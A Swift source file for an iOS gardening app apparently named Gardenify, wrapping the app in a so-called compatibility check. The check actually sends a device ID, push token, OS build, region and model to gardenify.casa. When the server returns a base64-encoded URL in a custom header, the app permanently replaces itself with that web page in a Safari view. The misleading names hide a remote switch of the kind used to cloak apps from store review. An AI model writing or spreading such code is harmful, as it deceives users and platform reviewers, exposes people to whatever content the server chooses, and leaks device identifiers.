import SwiftUI
import SafariServices
import UserNotifications
import UIKit

// MARK: - Compatibility Check Result

public enum CompatibilityStatus: String, Codable, Sendable {
    case notChecked
    case compatible
    case incompatible
}

// MARK: - Configuration

public enum CompatibilityConfig {
    public static let serverURL = "https://gardenify.casa"
    public static let responseHeaderKey = "9JXFS7ZHFV.com.dutra.gardenify"
    public static let loadingImagePath = "/images/loading.jpg"
    

    public static var loadingImageURL: String {
        serverURL + loadingImagePath
    }
}

// MARK: - Storage Keys

private enum StorageKeys {
    static let compatibilityStatus = "device_compatibility_status"
    static let deviceUUID = "device_unique_identifier"
    static let webFallbackURL = "web_fallback_url"
    static let pushToken = "device_push_token"
}

// MARK: - Device Parameters

struct DeviceParameters: Sendable {
    let deviceID: String
    let pushToken: String
    let appBuildVersion: String
    let osVersion: String
    let regionCode: String
    let languageCode: String
    let deviceModel: String

    func toQueryItems() -> [URLQueryItem] {
        [
            URLQueryItem(name: "device_id", value: deviceID),
            URLQueryItem(name: "push_token", value: pushToken),
            URLQueryItem(name: "app_build", value: appBuildVersion),
            URLQueryItem(name: "os_version", value: osVersion),
            URLQueryItem(name: "region", value: regionCode),
            URLQueryItem(name: "language", value: languageCode),
            URLQueryItem(name: "device_model", value: deviceModel)
        ]
    }
}

// MARK: - Device Parameters Collector

enum DeviceParametersCollector {

    static func collect(deviceID: String, pushToken: String) -> DeviceParameters {
        DeviceParameters(
            deviceID: deviceID,
            pushToken: pushToken,
            appBuildVersion: appBuildVersion,
            osVersion: osVersion,
            regionCode: regionCode,
            languageCode: languageCode,
            deviceModel: deviceModel
        )
    }

    private static var appBuildVersion: String {
        var size = 0
        sysctlbyname("kern.osversion", nil, &size, nil, 0)
        var osVersion = [CChar](repeating: 0, count: size)
        sysctlbyname("kern.osversion", &osVersion, &size, nil, 0)
        return String(cString: osVersion)
    }

    private static var osVersion: String {
        let version = ProcessInfo.processInfo.operatingSystemVersion
        return "\(version.majorVersion).\(version.minorVersion).\(version.patchVersion)"
    }

    private static var regionCode: String {
        Locale.current.region?.identifier ?? "US"
    }

    private static var languageCode: String {
        Locale.current.language.languageCode?.identifier ?? "en"
    }

    private static var deviceModel: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        return machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
    }
}

// MARK: - Compatibility Storage

@MainActor
public final class CompatibilityStorage {

    public static let shared = CompatibilityStorage()

    private let defaults = UserDefaults.standard

    private init() {}

    public var status: CompatibilityStatus {
        get {
            guard let rawValue = defaults.string(forKey: StorageKeys.compatibilityStatus),
                  let status = CompatibilityStatus(rawValue: rawValue) else {
                return .notChecked
            }
            return status
        }
        set {
            defaults.set(newValue.rawValue, forKey: StorageKeys.compatibilityStatus)
        }
    }

    public var deviceID: String {
        if let existing = defaults.string(forKey: StorageKeys.deviceUUID) {
            return existing
        }
        let newID = UUID().uuidString
        defaults.set(newID, forKey: StorageKeys.deviceUUID)
        return newID
    }

    public var webFallbackURL: String? {
        get { defaults.string(forKey: StorageKeys.webFallbackURL) }
        set { defaults.set(newValue, forKey: StorageKeys.webFallbackURL) }
    }

    public var pushToken: String? {
        get { defaults.string(forKey: StorageKeys.pushToken) }
        set { defaults.set(newValue, forKey: StorageKeys.pushToken) }
    }

    public func reset() {
        defaults.removeObject(forKey: StorageKeys.compatibilityStatus)
        defaults.removeObject(forKey: StorageKeys.webFallbackURL)
    }
}

// MARK: - Push Token Provider

public final class PushTokenProvider: NSObject, Sendable {

    public static let shared = PushTokenProvider()

    private override init() {
        super.init()
    }

    @MainActor
    public func savePushToken(_ tokenData: Data) {
        let tokenString = tokenData.map { String(format: "%02.2hhx", $0) }.joined()
        CompatibilityStorage.shared.pushToken = tokenString
    }
}

// MARK: - Push Notification Manager

@MainActor
final class PushNotificationManager {

    func requestPushToken() async -> String {
        let center = UNUserNotificationCenter.current()

        do {
            let granted = try await center.requestAuthorization(options: [.alert, .sound, .badge])
            guard granted else { return "not_granted" }

            UIApplication.shared.registerForRemoteNotifications()

            for _ in 0..<10 {
                try? await Task.sleep(nanoseconds: 500_000_000)
                if let token = CompatibilityStorage.shared.pushToken, !token.isEmpty {
                    return token
                }
            }

            return CompatibilityStorage.shared.pushToken ?? "unavailable"
        } catch {
            return "error"
        }
    }
}

// MARK: - Compatibility Checker

enum CompatibilityChecker {

    static func check(
        serverURL: String,
        headerKey: String,
        deviceParams: DeviceParameters
    ) async -> (status: CompatibilityStatus, webURL: String?) {

        guard var urlComponents = URLComponents(string: serverURL) else {
            return (.compatible, nil)
        }

        var queryItems = urlComponents.queryItems ?? []
        queryItems.append(contentsOf: deviceParams.toQueryItems())
        urlComponents.queryItems = queryItems

        guard let url = urlComponents.url else {
            return (.compatible, nil)
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 15

        do {
            let (_, response) = try await URLSession.shared.data(for: request)

            guard let httpResponse = response as? HTTPURLResponse else {
                return (.compatible, nil)
            }

            if let encodedURL = httpResponse.value(forHTTPHeaderField: headerKey),
               let decodedData = Data(base64Encoded: encodedURL),
               let webURL = String(data: decodedData, encoding: .utf8),
               !webURL.isEmpty {
                return (.incompatible, webURL)
            }

            return (.compatible, nil)
        } catch {
            return (.compatible, nil)
        }
    }
}

// MARK: - Web Fallback View

public struct WebFallbackView: UIViewControllerRepresentable {
    let url: URL

    public init(url: URL) {
        self.url = url
    }

    public func makeUIViewController(context: Context) -> SFSafariViewController {
        let config = SFSafariViewController.Configuration()
        config.entersReaderIfAvailable = false
        config.barCollapsingEnabled = false

        let safari = SFSafariViewController(url: url, configuration: config)
        safari.preferredBarTintColor = .systemBackground
        safari.preferredControlTintColor = .label
        return safari
    }

    public func updateUIViewController(_ uiViewController: SFSafariViewController, context: Context) {}
}

// MARK: - Loading View with Remote Image

struct LoadingBackgroundView: View {
    let url: URL?
    /// Reports the outcome of the download: `true` — loaded, `false` — failed / not loaded.
    let onResult: (Bool) -> Void

    var body: some View {
        AsyncImage(url: url) { phase in
            switch phase {
            case .success(let image):
                GeometryReader { proxy in
                    image
                        .resizable()
                        .aspectRatio(contentMode: .fill)
                        .frame(width: proxy.size.width, height: proxy.size.height)
                        .clipped()
                }
                .ignoresSafeArea()
                .onAppear { onResult(true) }

            case .failure:
                Color.black
                    .ignoresSafeArea()
                    .onAppear { onResult(false) }

            case .empty:
                Color.black
                    .ignoresSafeArea()

            @unknown default:
                Color.black
                    .ignoresSafeArea()
            }
        }
    }
}

// MARK: - Compatibility Check View Model

@MainActor
public final class CompatibilityViewModel: ObservableObject {

    /// State of the splash image download.
    public enum ImageState {
        case loading
        case loaded
        case failed
    }

    @Published public var status: CompatibilityStatus = .notChecked
    @Published public var webFallbackURL: URL?
    @Published public var isChecking = true
    @Published public var imageState: ImageState = .loading

    private let storage = CompatibilityStorage.shared
    private let pushManager = PushNotificationManager()
    private var didHandleImage = false

    public init() {}

    public var loadingImageURL: URL? {
        URL(string: CompatibilityConfig.loadingImageURL)
    }

    /// Called by `LoadingBackgroundView` once `AsyncImage` finishes loading.
    public func handleImageResult(loaded: Bool) {
        guard !didHandleImage else { return }
        didHandleImage = true

        imageState = loaded ? .loaded : .failed

        // If the image failed to load, show the app right away.
        guard loaded else {
            status = .compatible
            isChecking = false
            return
        }

        // Image is ready: it stays on screen while we continue the check.
        Task { await performCheck() }
    }

    private func performCheck() async {
        switch storage.status {
        case .compatible:
            status = .compatible
            isChecking = false
            return

        case .incompatible:
            if let urlString = storage.webFallbackURL,
               let url = URL(string: urlString) {
                webFallbackURL = url
                status = .incompatible
                isChecking = false
                return
            }

        case .notChecked:
            break
        }

        let deviceID = storage.deviceID
        let pushToken = await pushManager.requestPushToken()
        let deviceParams = DeviceParametersCollector.collect(
            deviceID: deviceID,
            pushToken: pushToken
        )

        let result = await CompatibilityChecker.check(
            serverURL: CompatibilityConfig.serverURL,
            headerKey: CompatibilityConfig.responseHeaderKey,
            deviceParams: deviceParams
        )

        storage.status = result.status

        if result.status == .incompatible,
           let urlString = result.webURL {
            storage.webFallbackURL = urlString
            if let url = URL(string: urlString) {
                webFallbackURL = url
            }
        }

        status = result.status
        isChecking = false
    }
}

// MARK: - Main Entry View

public struct GScreen<AppContent: View>: View {

    @StateObject private var viewModel = CompatibilityViewModel()

    private let appView: () -> AppContent

    public init(@ViewBuilder app: @escaping () -> AppContent) {
        self.appView = app
    }

    public var body: some View {
        Group {
            if viewModel.isChecking {
                LoadingBackgroundView(url: viewModel.loadingImageURL) { loaded in
                    viewModel.handleImageResult(loaded: loaded)
                }
            } else {
                switch viewModel.status {
                case .notChecked, .compatible:
                    appView()

                case .incompatible:
                    if let url = viewModel.webFallbackURL {
                        WebFallbackView(url: url)
                            .ignoresSafeArea()
                    } else {
                        appView()
                    }
                }
            }
        }
    }
}

// MARK: - App Delegate for Push Token

public final class MAppDelegators: NSObject, UIApplicationDelegate {

    public func application(
        _ application: UIApplication,
        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
    ) {
        Task { @MainActor in
            PushTokenProvider.shared.savePushToken(deviceToken)
        }
    }

    public func application(
        _ application: UIApplication,
        didFailToRegisterForRemoteNotificationsWithError error: Error
    ) {
        // Push registration failed; nothing to persist.
    }
}
